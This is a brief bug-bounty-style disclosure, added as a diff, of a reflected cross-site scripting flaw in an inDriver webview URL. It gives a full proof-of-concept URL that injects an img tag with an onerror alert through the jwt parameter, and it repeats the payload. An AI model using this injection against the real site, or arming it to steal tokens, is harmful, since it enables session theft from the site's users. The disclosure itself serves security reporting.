@@ -1,0 +1,4 @@
+As we all know that xss perform from anywhere so It is necessary to protect that recently i had discover a vulnerability in indriver website url have a vulnerability name url xss and the payload for that
+https://watchdocs.indriverapp.com/webview/v1?phone=%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88&token=%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22)%3E#/
+
+## The main payload =>   onerror=alert(%22hackerone%22)%3E#
